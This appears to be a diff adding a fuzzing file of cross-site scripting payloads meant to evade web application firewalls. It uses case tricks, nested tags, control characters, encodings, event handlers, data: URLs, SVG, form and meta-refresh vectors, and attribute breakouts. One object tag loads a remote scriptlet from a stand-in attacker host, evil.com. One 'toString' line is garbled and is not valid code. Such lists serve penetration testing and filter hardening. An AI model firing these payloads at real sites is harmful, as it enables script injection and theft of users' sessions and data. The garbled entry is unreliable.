@@ -1,0 +1,73 @@
+# XSS WAF Bypass payloads
+# For bypassing Web Application Firewalls
+# Curated from SecLists/Fuzzing/XSS/
+
+# Case manipulation
+<ScRiPt>alert(1)</ScRiPt>
+<sCrIpT>alert(1)</sCrIpT>
+<scRIPT>alert(1)</scrIPT>
+
+# Double tags (for filters that remove once)
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<<script>alert(1)</script>
+<script<script>>alert(1)</script<script>>
+
+# Null bytes and whitespace
+<script\x00>alert(1)</script>
+<script\x20>alert(1)</script>
+<script\x0d>alert(1)</script>
+<script\x0a>alert(1)</script>
+<script\x09>alert(1)</script>
+
+# Different encodings
+<script>alert&#40;1&#41;</script>
+<script>alert&#x28;1&#x29;</script>
+<script>\u0061lert(1)</script>
+<img src=x onerror=\u0061lert(1)>
+
+# Without parentheses
+<script>alert`1`</script>
+<img src=x onerror=alert`1`>
+<svg onload=alert`1`>
+
+# Without alert keyword
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<img src=x onerror=confirm(1)>
+<img src=x onerror=prompt(1)>
+
+# Using event handlers
+<body/onpageshow=alert(1)>
+<body/onresize=alert(1)>resize
+<details/open/ontoggle=alert(1)>
+<video><source onerror=alert(1)>
+<video/poster/onerror=alert(1)//>
+
+# Using data: URLs
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+
+# SVG variations
+<svg><script>alert(1)</script></svg>
+<svg><script href="data:text/javascript,alert(1)"></script></svg>
+<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><image href=x onerror=alert(1) /></svg>#x">
+
+# Form-based XSS
+<form action="javascript:alert(1)"><input type=submit>
+<form id=test /><button form=test formaction="javascript:alert(1)">click
+
+# Object tag
+<object data="javascript:alert(1)">
+<object type="text/x-scriptlet" data="http://evil.com/xss.sct">
+
+# Using toString
+<img src=x onerror=alert(1..telephones.telephones.)>
+
+# Meta refresh
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+
+# Without < > characters (for attribute injection)
+" autofocus onfocus=alert(1) x="
+' autofocus onfocus=alert(1) x='
+" onmouseover=alert(1) x="
+' onmouseover=alert(1) x='
